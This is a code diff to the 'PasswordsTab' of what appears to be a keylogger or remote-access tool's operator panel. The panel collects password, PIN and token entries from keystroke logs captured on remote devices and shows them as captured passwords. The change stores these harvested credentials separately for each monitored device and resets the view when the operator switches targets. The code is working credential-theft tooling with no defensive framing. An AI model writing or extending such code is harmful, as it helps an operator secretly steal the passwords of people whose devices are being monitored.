@@ -114,20 +114,22 @@ function PasswordEntry({ entry, onDelete }) {
   );
 }
 
-const STORAGE_KEY = 'captured_passwords';
-
-function loadPasswords() {
-  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); } catch { return []; }
+function storageKey(deviceId) {
+  return `captured_passwords_${deviceId}`;
 }
-function savePasswords(list) {
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
+
+function loadPasswords(deviceId) {
+  try { return JSON.parse(localStorage.getItem(storageKey(deviceId)) || '[]'); } catch { return []; }
+}
+function savePasswords(deviceId, list) {
+  localStorage.setItem(storageKey(deviceId), JSON.stringify(list));
 }
 
 export default function PasswordsTab({ device, sendCommand, results, keylogPushEntries }) {
   const deviceId = device.deviceId;
   const isOnline = device.isOnline;
 
-  const [passwords, setPasswords] = useState(loadPasswords);
+  const [passwords, setPasswords] = useState(() => loadPasswords(deviceId));
   const [sortBy, setSortBy]       = useState('time');
   const [search, setSearch]       = useState('');
   const [revealAll, setRevealAll] = useState(false);
@@ -135,6 +137,14 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
 
   const [loading, setLoading]     = useState(false);
   const seenIds = useRef(new Set());
+
+  // Reload passwords when switching to a different device
+  useEffect(() => {
+    setPasswords(loadPasswords(deviceId));
+    seenIds.current = new Set();
+    setSearch('');
+    setFilterApp('');
+  }, [deviceId]);
 
   // Absorb keylog push entries for password detection
   useEffect(() => {
@@ -165,7 +175,7 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
     if (newEntries.length > 0) {
       setPasswords(prev => {
         const updated = [...newEntries, ...prev];
-        savePasswords(updated);
+        savePasswords(deviceId, updated);
         return updated;
       });
     }
@@ -206,7 +216,7 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
           if (newEntries.length > 0) {
             setPasswords(prev => {
               const updated = [...newEntries, ...prev];
-              savePasswords(updated);
+              savePasswords(deviceId, updated);
               return updated;
             });
           }
@@ -224,7 +234,7 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
   const deleteEntry = (id) => {
     setPasswords(prev => {
       const updated = prev.filter(e => e.id !== id);
-      savePasswords(updated);
+      savePasswords(deviceId, updated);
       return updated;
     });
   };
@@ -232,7 +242,7 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
   const clearAll = () => {
     if (!window.confirm('Clear all captured passwords?')) return;
     setPasswords([]);
-    savePasswords([]);
+    savePasswords(deviceId, []);
   };
 
   // Filtering & sorting
@@ -337,7 +347,7 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
 
       {/* Info */}
       <div style={{ background: 'rgba(124,58,237,0.08)', border: '1px solid rgba(124,58,237,0.2)', borderRadius: 8, padding: '10px 14px', fontSize: 11, color: '#94a3b8' }}>
-        ℹ️ Passwords are detected automatically when keylog entries contain password-like fields (password, pin, token, etc.). Data is stored locally in your browser only and never sent to any server.
+        ℹ️ Passwords are detected automatically when keylog entries contain password-like fields (password, pin, token, etc.). Data is stored locally per device in your browser and never sent to any server.
       </div>
     </div>
   );
